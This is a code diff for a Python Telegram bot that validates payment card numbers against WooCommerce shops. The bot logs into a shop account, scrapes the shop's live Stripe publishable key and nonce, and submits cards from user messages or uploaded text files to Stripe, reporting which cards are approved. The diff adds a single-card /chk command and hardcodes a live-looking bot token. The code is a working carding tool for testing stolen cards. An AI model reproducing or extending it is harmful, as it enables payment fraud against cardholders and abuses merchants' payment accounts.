@@ -2,18 +2,16 @@ import requests
 import re
 import threading
 import logging
-import json
 from bs4 import BeautifulSoup
 from io import BytesIO
 from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 
-BOT_TOKEN = "7248159727:AAEzc2CNStU6H8F3zD4Y5CFIYRSkyhO_TiQ"
+BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"
 
 logging.basicConfig(level=logging.INFO)
 user_data = {}
 lock = threading.Lock()
-
 
 def get_headers():
     return {
@@ -21,7 +19,6 @@ def get_headers():
         "accept": "text/html,application/xhtml+xml",
         "accept-language": "en-US,en;q=0.9",
     }
-
 
 def detect_stripe_type(html):
     if "setup_intent" in html:
@@ -34,11 +31,9 @@ def detect_stripe_type(html):
         return "token"
     return "unknown"
 
-
 def extract_pk(html):
     match = re.search(r'pk_live_[a-zA-Z0-9]{10,}', html)
     return match.group(0) if match else None
-
 
 def try_login(site, email, password, session):
     login_url = f"https://{site}/my-account/"
@@ -60,7 +55,6 @@ def try_login(site, email, password, session):
 
     r = session.post(login_url, data=payload, headers=get_headers())
     return ("customer-logout" in r.text), r.text
-
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -86,7 +80,6 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         }
 
     await update.message.reply_text("Login successful! Now send the Add Payment Method URL.")
-
 
 async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -116,11 +109,9 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-
 def parse_card(card):
     match = re.match(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})', card)
     return match.groups() if match else None
-
 
 def check_card(card, data):
     try:
@@ -133,8 +124,6 @@ def check_card(card, data):
 
         session = data["session"]
         check_url = data["check_url"]
-
-        # Always re-fetch for fresh ajax_nonce
         r = session.get(check_url, headers=get_headers())
         html = r.text
 
@@ -144,7 +133,6 @@ def check_card(card, data):
         if not pk or not ajax_nonce:
             return f"{card} -> ⚠️ Error: Missing pk or nonce"
 
-        # Create payment method
         r = requests.post(
             "https://api.stripe.com/v1/payment_methods",
             headers={"Authorization": f"Bearer {pk}"},
@@ -179,6 +167,19 @@ def check_card(card, data):
     except Exception as e:
         return f"{card} -> ⚠️ Error: {str(e)}"
 
+async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_data:
+        await update.message.reply_text("Please login and set the payment URL first.")
+        return
+
+    if len(context.args) != 1:
+        await update.message.reply_text("Usage: /chk 4111111111111111|12|25|123")
+        return
+
+    card = context.args[0]
+    result = check_card(card, user_data[user_id])
+    await update.message.reply_text(result, parse_mode='Markdown')
 
 async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -221,10 +222,10 @@ async def handle_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("No approved cards found.")
 
-
 if __name__ == "__main__":
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
+    app.add_handler(CommandHandler("chk", chk))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
-    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), handle_txt))
+    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), handle_txt))
     app.run_polling()
